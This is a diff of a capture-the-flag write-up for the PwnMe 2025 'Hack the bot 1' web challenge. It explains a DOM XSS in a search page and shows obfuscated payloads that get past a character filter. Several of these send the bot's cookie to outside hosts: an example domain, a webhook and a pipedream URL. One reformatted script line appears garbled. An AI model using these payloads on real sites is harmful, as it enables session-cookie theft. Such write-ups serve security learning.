@@ -13,93 +13,99 @@ section: "CTFs"
 This was a medium whitebox challenge, the files are available for download [here](https://github.com/sajjadium/ctf-archives/tree/64792ed55d90e43deb30cca2aa1f09e106a0eee3/ctfs/PwnMe/2025/Quals/web/Hack_the_bot_1)
 
 The first flag is stored in a cookie that the bot will have.
+
 ```js
-const express = require('express');
-const path = require('path');
-const fs = require('fs');
-const { spawn } = require('child_process');
-const puppeteer = require('puppeteer');
-const { format } = require('date-fns');
+const express = require("express");
+const path = require("path");
+const fs = require("fs");
+const { spawn } = require("child_process");
+const puppeteer = require("puppeteer");
+const { format } = require("date-fns");
 
 const app = express();
 const port = 5000;
 
-const logPath = '/tmp/bot_folder/logs/';
-const browserCachePath = '/tmp/bot_folder/browser_cache/';
+const logPath = "/tmp/bot_folder/logs/";
+const browserCachePath = "/tmp/bot_folder/browser_cache/";
 
 const cookie = {
-    name: 'Flag',
-    value: "PWNME{FAKE_FLAG}",
-    sameSite: 'Strict'
+  name: "Flag",
+  value: "PWNME{FAKE_FLAG}",
+  sameSite: "Strict",
 };
 
 app.use(express.urlencoded({ extended: true }));
 
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static(path.join(__dirname, "public")));
 
-app.set('views', path.join(__dirname, 'views'));
-app.set('view engine', 'ejs');
+app.set("views", path.join(__dirname, "views"));
+app.set("view engine", "ejs");
 
 if (!fs.existsSync(logPath)) {
-    fs.mkdirSync(logPath, { recursive: true });
+  fs.mkdirSync(logPath, { recursive: true });
 }
 
 if (!fs.existsSync(browserCachePath)) {
-    fs.mkdirSync(browserCachePath, { recursive: true });
+  fs.mkdirSync(browserCachePath, { recursive: true });
 }
 
-const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
 
 async function startBot(url, name) {
-    const logFilePath = path.join(logPath, `${name}.log`);
+  const logFilePath = path.join(logPath, `${name}.log`);
 
-    try {
-        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
-        logStream.write(`${new Date()} : Attempting to open website ${url}\n`);
+  try {
+    const logStream = fs.createWriteStream(logFilePath, { flags: "a" });
+    logStream.write(`${new Date()} : Attempting to open website ${url}\n`);
 
-        const browser = await puppeteer.launch({
-            headless: 'new',
-            args: ['--remote-allow-origins=*','--no-sandbox', '--disable-dev-shm-usage', `--user-data-dir=${browserCachePath}`]
-        });
+    const browser = await puppeteer.launch({
+      headless: "new",
+      args: [
+        "--remote-allow-origins=*",
+        "--no-sandbox",
+        "--disable-dev-shm-usage",
+        `--user-data-dir=${browserCachePath}`,
+      ],
+    });
 
-        const page = await browser.newPage();
-        await page.goto(url);
+    const page = await browser.newPage();
+    await page.goto(url);
 
-        if (url.startsWith("http://localhost/")) {
-            await page.setCookie(cookie);
-        }
-
-        logStream.write(`${new Date()} : Successfully opened ${url}\n`);
-        
-        await sleep(7000);
-        await browser.close();
-
-        logStream.write(`${new Date()} : Finished execution\n`);
-        logStream.end();
-    } catch (e) {
-        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
-        logStream.write(`${new Date()} : Exception occurred: ${e}\n`);
-        logStream.end();
+    if (url.startsWith("http://localhost/")) {
+      await page.setCookie(cookie);
     }
+
+    logStream.write(`${new Date()} : Successfully opened ${url}\n`);
+
+    await sleep(7000);
+    await browser.close();
+
+    logStream.write(`${new Date()} : Finished execution\n`);
+    logStream.end();
+  } catch (e) {
+    const logStream = fs.createWriteStream(logFilePath, { flags: "a" });
+    logStream.write(`${new Date()} : Exception occurred: ${e}\n`);
+    logStream.end();
+  }
 }
 
-app.get('/', (req, res) => {
-    res.render('index');
+app.get("/", (req, res) => {
+  res.render("index");
 });
 
-app.get('/report', (req, res) => {
-    res.render('report');
+app.get("/report", (req, res) => {
+  res.render("report");
 });
 
-app.post('/report', (req, res) => {
-    const url = req.body.url;
-    const name = format(new Date(), "yyMMdd_HHmmss");
-    startBot(url, name);
-    res.status(200).send(`logs/${name}.log`);
+app.post("/report", (req, res) => {
+  const url = req.body.url;
+  const name = format(new Date(), "yyMMdd_HHmmss");
+  startBot(url, name);
+  res.status(200).send(`logs/${name}.log`);
 });
 
 app.listen(port, () => {
-    console.log(`App running at http://0.0.0.0:${port}`);
+  console.log(`App running at http://0.0.0.0:${port}`);
 });
 ```
 
@@ -109,6 +115,7 @@ The general function of the application is that is displays some articles and we
 ![hackthebot1articles.png](images/25-pwnmequals/hackthebot1articles.png)
 
 Looking at the functionality of search, the source code `source/public/js/script.js` reveals a vulnerability:
+
 ```js
 function getSearchQuery() {
     const params = new URLSearchParams(window.location.search);
@@ -150,14 +157,15 @@ function searchArticles(searchInput = document.getElementById('search-input').va
 ```
 
 Reading through the functions, this snippet grabs my attention:
+
 ```js
-    const noMatchMessage = document.getElementById('no-match-message');
-    if (!found && searchInput) {
-        noMatchMessage.innerHTML = `No results for "${searchInput}".`;
-        noMatchMessage.style.display = 'block';
-    } else {
-        noMatchMessage.style.display = 'none';
-    }
+const noMatchMessage = document.getElementById("no-match-message");
+if (!found && searchInput) {
+  noMatchMessage.innerHTML = `No results for "${searchInput}".`;
+  noMatchMessage.style.display = "block";
+} else {
+  noMatchMessage.style.display = "none";
+}
 ```
 
 If there is no result, the user input is mirrored to the innerHTML, this is a DOM XSS!
@@ -175,6 +183,7 @@ Oh. It's in the article .w.
 ![hackthebot1inpurtonfocus.png](images/25-pwnmequals/hackthebot1inpurtonfocus.png)
 
 So we need to find some other attribute, we used `onfocusin`:
+
 ```
 <input autofocus onfocusin=confirm()>
 ```
@@ -203,6 +212,7 @@ const isMatch = searchWords.some(word => word && new RegExp(`${word}`, 'ui').tes
 This made avoiding the string collisions challenging, but the workaround we found utilised `.substr()`.
 
 We were able to wrap a built string in `eval()` to achieve the XSS exfiltration:
+
 ```js
 <input onfocusin="eval('fetcha'.substr(0,5)+'(\''+'httpa'.substr(0,4)+'://exam'+'.pla'.substr(0,2)+'eex.'+'coma'.substr(0,3)+'/?yeet='+btoa(document.cookie)+'\')')" autofocus>
 ```
@@ -212,7 +222,17 @@ This works for local (sometimes) but because the cookie is set after we can't re
 We had two solutions for this challenge (but I will outline some more at the end for learning).
 
 ```js
-'set'+eval('\'\\xa'.substr(0,3) + '54' + '\'') +'imeout(function(){'+'fetcha'.substr(0,5)+'(\''+'httpa'.substr(0,4)+'://example'+'.pla'.substr(0,2)+'eex.'+'coma'.substr(0,3)+'/?yeet=\'+btoa(document.cookie))},2000)'
+"set" +
+  eval("'\\xa".substr(0, 3) + "54" + "'") +
+  "imeout(function(){" +
+  "fetcha".substr(0, 5) +
+  "('" +
+  "httpa".substr(0, 4) +
+  "://example" +
+  ".pla".substr(0, 2) +
+  "eex." +
+  "coma".substr(0, 3) +
+  "/?yeet='+btoa(document.cookie))},2000)";
 ```
 
 As caps were blocked, we needed to use an eval inside the eval to create a capital letter to build the `setTimeout` function name, that's what `eval('\'\\xa'.substr(0,3) + '54' + '\'')` is for. This builds `\x54` which results in `T`.
@@ -228,25 +248,30 @@ Flag: `PWNME{D1d_y5U_S4iD-F1lt33Rs?}`
 My idea was to add a `script` element to the end of the document and to have a custom `src` that allowed any script to be executed from our own domain, instead of filtering a script each time.
 
 I ended up making this payload:
+
 ```js
 <input onfocusin="eval('vara'.substr(0,3)+' '+'llasa'.substr(0,4)+'='+'docua'.substr(0,4)+'ment.vv'.substr(0,5)+'creav'.substr(0,4)+'vtev'.substr(1,2)+eval('\'\\xa'.substr(0,3)+'45'+'\'')+'laa'.substr(0,1)+'ementa'.substr(0,5)+'(\'scvv'.substr(0,4)+'riv'.substr(0,2)+'ptvv'.substr(0,2)+'\'qq'.substr(0,1)+')'+';llas.svv'.substr(0,7)+'ara'.substr(1,1)+'aca'.substr(1,1)+'vv=vv'.substr(2,1)+'zxz\'//zxz'.substr(3,3)+'afil'.substr(1,3)+'vesv'.substr(1,2)+'.'.substr(0,1)+'vseallv'.substr(1,5)+'.'.substr(0,1)+'vvdev/bvv'.substr(2,5)+'\';'+'docum'+'aaent.'.substr(2,4)+'boa'.substr(0,2)+'dy'+'.'.substr(0,1)+'vapv'.substr(1,2)+'pend'+'(llas);')" autofocus>
 ```
 
 This (in readable form) is this:
+
 ```js
-var llas=document.createElement('script');llas.src='//files.seall.dev/b';document.body.append(llas);
+var llas = document.createElement("script");
+llas.src = "//files.seall.dev/b";
+document.body.append(llas);
 ```
 
 It's just grabbing a file from my GitHub Pages site, and executing it as JavaScript.
 
 The contents of which was:
+
 ```js
 (function checkCookiesAndSendRequest() {
-  if (document.cookie !== '') {
+  if (document.cookie !== "") {
     fetch(`http://WEBHOOK/?cookies=${btoa(document.cookie)}`)
-      .then(response => response.text())
-      .then(data => console.log('sent!'))
-      .catch(error => console.error('Error:', error));
+      .then((response) => response.text())
+      .then((data) => console.log("sent!"))
+      .catch((error) => console.error("Error:", error));
   } else {
     setTimeout(checkCookiesAndSendRequest, 100);
   }
@@ -258,13 +283,21 @@ This then exfiltrates the cookies.
 ### iFrame SRCDOC
 
 This was another solution by another player:
+
 ```html
-http://localhost/?q=<iframe srcdoc='%26%2360;%26%23115;%26%2399;%26%23114;%26%23105;%26%23112;%26%23116;%26%2362;%26%23115;%26%23101;%26%23116;%26%2384;%26%23105;%26%23109;%26%23101;%26%23111;%26%23117;%26%23116;%26%2340;%26%2340;%26%2340;%26%2341;%26%2332;%26%2361;%26%2362;%26%2332;%26%23123;%26%23108;%26%23111;%26%2399;%26%2397;%26%23116;%26%23105;%26%23111;%26%23110;%26%2361;%26%2339;%26%23104;%26%23116;%26%23116;%26%23112;%26%23115;%26%2358;%26%2347;%26%2347;%26%23101;%26%23111;%26%2353;%26%23102;%26%2348;%26%23113;%26%23104;%26%2397;%26%23102;%26%23117;%26%2353;%26%23120;%26%2353;%26%2348;%26%23107;%26%2346;%26%23109;%26%2346;%26%23112;%26%23105;%26%23112;%26%23101;%26%23100;%26%23114;%26%23101;%26%2397;%26%23109;%26%2346;%26%23110;%26%23101;%26%23116;%26%2347;%26%2339;%26%2343;%26%23100;%26%23111;%26%2399;%26%23117;%26%23109;%26%23101;%26%23110;%26%23116;%26%2346;%26%2399;%26%23111;%26%23111;%26%23107;%26%23105;%26%23101;%26%23125;%26%2341;%26%2344;%26%2332;%26%2349;%26%2348;%26%2348;%26%2348;%26%2341;%26%2360;%26%2347;%26%23115;%26%2399;%26%23114;%26%23105;%26%23112;%26%23116;%26%2362;'></iframe>
+http://localhost/?q=<iframe
+  srcdoc="%26%2360;%26%23115;%26%2399;%26%23114;%26%23105;%26%23112;%26%23116;%26%2362;%26%23115;%26%23101;%26%23116;%26%2384;%26%23105;%26%23109;%26%23101;%26%23111;%26%23117;%26%23116;%26%2340;%26%2340;%26%2340;%26%2341;%26%2332;%26%2361;%26%2362;%26%2332;%26%23123;%26%23108;%26%23111;%26%2399;%26%2397;%26%23116;%26%23105;%26%23111;%26%23110;%26%2361;%26%2339;%26%23104;%26%23116;%26%23116;%26%23112;%26%23115;%26%2358;%26%2347;%26%2347;%26%23101;%26%23111;%26%2353;%26%23102;%26%2348;%26%23113;%26%23104;%26%2397;%26%23102;%26%23117;%26%2353;%26%23120;%26%2353;%26%2348;%26%23107;%26%2346;%26%23109;%26%2346;%26%23112;%26%23105;%26%23112;%26%23101;%26%23100;%26%23114;%26%23101;%26%2397;%26%23109;%26%2346;%26%23110;%26%23101;%26%23116;%26%2347;%26%2339;%26%2343;%26%23100;%26%23111;%26%2399;%26%23117;%26%23109;%26%23101;%26%23110;%26%23116;%26%2346;%26%2399;%26%23111;%26%23111;%26%23107;%26%23105;%26%23101;%26%23125;%26%2341;%26%2344;%26%2332;%26%2349;%26%2348;%26%2348;%26%2348;%26%2341;%26%2360;%26%2347;%26%23115;%26%2399;%26%23114;%26%23105;%26%23112;%26%23116;%26%2362;"
+></iframe>
 ```
 
 They used HTML escape codes inside an `iframe`'s `srcdoc` to run the following:
+
 ```js
-<script>setTimeout((() => {location='https://eo5f0qhafu5x50k.m.pipedream.net/'+document.cookie}), 1000)</script>
+<script>
+  setTimeout((() =>{" "}
+  {(location = "https://eo5f0qhafu5x50k.m.pipedream.net/" + document.cookie)}),
+  1000)
+</script>
 ```
 
 Which then exfiltrated the cookie!
